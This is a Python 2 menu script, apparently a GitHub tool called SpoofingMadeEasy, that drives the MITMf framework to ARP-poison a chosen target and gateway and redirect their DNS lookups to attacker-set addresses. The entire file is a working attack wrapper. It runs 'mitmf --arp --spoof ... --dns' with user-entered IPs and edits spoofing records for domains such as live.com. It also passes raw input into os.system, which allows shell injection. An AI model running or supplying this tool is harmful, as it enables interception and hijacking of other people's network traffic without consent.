import time
from time import sleep
import os
import sys

def clear():
	os.system("clear")
	
clear()

def main_menu():
	print("")
	print("	  _______     ______ ____  _____    _    _          _____ _  __ _____    ")
	print("  / ____\ \   / /  _ \___ \|  __ \  | |  | |   /\   / ____| |/ // ____|   ")
	print(" | |     \ \_/ /| |_) |__) | |__) | | |__| |  /  \ | |    | ' /| (___     ")
	print(" | |      \   / |  _ <|__ <|  _  /  |  __  | / /\ \| |    |  <  \___ \    ")
	print(" | |____   | |  | |_) |__) | | \ \  | |  | |/ ____ \ |____| . \ ____) |   ")
	print("  \_____|  |_|  |____/____/|_|  \_\ |_|  |_/_/    \_\_____|_|\_\_____/    ")
	print("")
	print(" #~ Cybersecurity Penetration Testing/Ethical Hacking                     ")
	print(" #~ SpoofingMadeEasy V.1.0")
	print(" #~ Contact: Please contact me if you find any bugs!")
	print(" #~ GitHub: https://github.com/Cyb3rHacks")
	print("")
	print(" \033[91mNOTE: I am not taking credit for MITMF - this is NOT my tool. I am only making it easier for people starting with MIMTF.\033[97m")
	print("")
	print("")
	print(" 1 #> Install MITMF                 \033[94m#Install Man In The Middle Framework\033[97m")
	print(" 2 #> Change DNS records            \033[94m#Change websites that the target will be redirected to\033[97m")
	print(" 3 #> Target Information            \033[94m#Save/Change Gateway IP and Target IP for future attacks\033[97m")
	print(" 4 #> Start Spoofing Attack         \033[94m#Start Spoofing Attack\033[97m")
	print(" 5 #> Exit                          \033[94m#Exit script - back to terminal\033[97m")
	
	print("")
	print("")
	
	optionChoise = raw_input("Please select an option [1-5]: ")
	if optionChoise ==("1"):
		mitmfInstall()
	elif optionChoise ==("2"):
		Arecord()
	
	elif optionChoise ==("3"):
		saveFile()
	elif optionChoise ==("4"):
		dnsspoofing()
	elif optionChoise==("5"):
		clear()
		exit()
	else:
		print("")
		while True:
			clear()
			main_menu()
			break
	
def mitmfInstall():
	clear()
	os.system("sudo apt-get install mitmf")
	clear()
	main_menu()

def saveFile():
	clear()
	print("")
	print(" 1 #> Change Current Target Information")
	print(" 2 #> View Current Target Information")
	print(" 3 #> Back to main menu")
	print("")
	optionChoise = raw_input("Please select an option [1-3]: ")		
		
	if optionChoise==("1"):
		f = open("GatewayIp.txt","w")
		print("")
		gatewayip = raw_input ("Please enter your target Gateway IP [xxx.xxx.x.x]: ")
		f.write(gatewayip)
		f.close()
		print("")
		print(gatewayip + " sucessfully added to targets.")
		f2 = open("TargetIp.txt","w")
		print("")
		targetip = raw_input ("Please enter your Target IP [xxx.xxx.x.xxx]: ")
		f2.write(targetip)
		f2.close()
		print("")
		print(targetip + " sucessfully added to targets.")
		sleep(2)
		clear()
		saveFile()
		
	elif optionChoise ==("2"):
		print("")
		print(" Currrent Target Infmation:")
		print("")
		f = open("GatewayIp.txt","r")
		gatewayip = f.read()
		print(" Target Gateway: " + gatewayip)
		f.close()
		f = open("TargetIp.txt","r")
		targetip = f.read()
		print(" Target IP Address: " + targetip)
		print("")
		f.close()
		while True:
			userChoise = raw_input (" #> Go Back? [y]: ")
			if userChoise ==("y" or "Y"):
				saveFile()
				break
			
	
	elif optionChoise ==("3"):
		clear()
		main_menu()	
	else:
		print("")
		print("That was an invalid option. Please try again.")
		sleep(2)
		saveFile()		
			
def Arecord():
	clear()
	print("")
	print(" 1 #> I'm sure I want to change them")
	print(" 2 #> Back to main menu")
	print("")
	choise = raw_input("Please select an option [1-2]: ")
	if choise ==("1"):
		clear()
		print("Loading DNS records. Please save and exit once finished. Lauching in 5 seconds...")
		print("")
		print("")
		print("\033[94m##################################################################\033[97m")
		print("")
		print("                nameservers = 8.8.8.8")
		print("")
                print("[[[A]]]     # Queries for IPv4 address records")
                print("*.thesprawl.org= \033[91mxxx.xxx.x.xxx\033[97m")
                print("*.live.com= \033[91mxxx.xxx.x.xxx\033[97m")
                print("*.*.com= \033[91mxxx.xxx.x.xxx\033[97m")
                print("")
		print("\033[94m##################################################################\033[97m")
		print("")
		print("Above is an example of what you need to change marked X: ")
		print("")
		understand = raw_input(" #> UNDERSTOOD? [y/n]: ")
		if understand ==("y"or"Y"or" "):
			os.system("nano /etc/mitmf/mitmf.conf")
			clear()
			userChoise = raw_input("Do you want to launch the attack now? [y/n]")
			if userChoise==("y"or"Y"):
				clear()
				dnsspoofing()
			else:
				Arecord()
		elif understand ==("n"or"N"):
			clear()
			print("")
			print("Please find more help online: https://github.com/byt3bl33d3r/MITMf")
			print("")
			exit()
		else:
			print("")
			while True:
				clear()
				Arecord()
				break
			
	elif choise ==("2"):
		clear()
		main_menu()
	
	else:
		print("")
		while True:
			clear()
			Arecord()
			break
		
def dnsspoofing():
	clear()
	print("")
	print(" 1 #> Use Saved File Information      \033[94m#This loads information from previous saved file\033[97m")
	print(" 2 #> Enter Customer Information      \033[94m#Enter custom Target IP and Gateway IP \033[97m")
	print(" 3 #> Back to main menu               ")
	print("")
	userChoise = raw_input ("Please select an option [1-2]: ")
	if userChoise ==("1"):
		clear()
		print("")
		connectiontype = raw_input("Please enter your network interface [eg.wlan0]: ")
		print("")
		sleep(2)
		f = open ("GatewayIp.txt","r")
		gatewayip = f.readline()
		f = open ("TargetIp.txt","r")
		targetip = f.readline()
		os.system("mitmf --arp --spoof --gateway " + gatewayip + " --target " + targetip + " -i " + connectiontype + " --dns")
		clear()
		main_menu()
	
	
	elif userChoise ==("2"):
		clear()
		print("")
		connectiontype = raw_input ("Please enter your network interface [eg.wlan0]: ")
		print("")
		gatewayip = raw_input ("Please enter your target Gateway IP [xxx.xxx.x.x]: ")
		print("")
		print(gatewayip + " sucessfully added to targets.")
		print("")
		targetip = raw_input ("Please enter your Target IP [xxx.xxx.x.xxx]: ")
		print("")
		print(targetip + " sucessfully added to targets.")
		print("")
		print("Preparing to launch script. Please press ctrl-c when you are finished.")
		sleep(5)
		os.system("mitmf --arp --spoof --gateway " + gatewayip + " --target " + targetip + " -i " + connectiontype + " --dns")
		print("")
		main_menu()
		

	elif userChoise ==("3"):
		clear()
		main_menu()
		
	else:	
		print("")
		print("That was an invlid option.")
		print("")
		while True:
			userChoise = raw_input (" #> Go Back? [y]: ")
			if userChoise ==("y" or "Y"):
				dnsspoofing()
				break

main_menu()
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
